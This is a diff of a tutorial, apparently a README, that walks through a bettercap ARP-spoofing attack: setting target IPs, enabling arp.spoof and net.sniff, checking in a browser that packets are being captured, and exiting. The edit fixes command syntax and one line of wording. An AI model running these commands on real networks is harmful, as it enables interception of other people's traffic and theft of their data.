@@ -21,12 +21,12 @@
 &emsp;&emsp;&emsp;$ set arp.spoof.targets ip1,ip2,ip3....
 
 7. Now run the following commands to start the attack <br>
-&emsp;&emsp;&emsp;$ arp.spoof.on <br>
-&emsp;&emsp;&emsp;$ net.sniff.on
+&emsp;&emsp;&emsp;$ arp.spoof on <br>
+&emsp;&emsp;&emsp;$ net.sniff on
 
 8. Now check the attack by using any browser, if the bettercap is capturing the packets then the attack is working properly.
 
 9. To exit the attack run <br>
 &emsp;&emsp;&emsp;$ exit
 
-10. That's it, you did it.
+10. That's it, we did it.
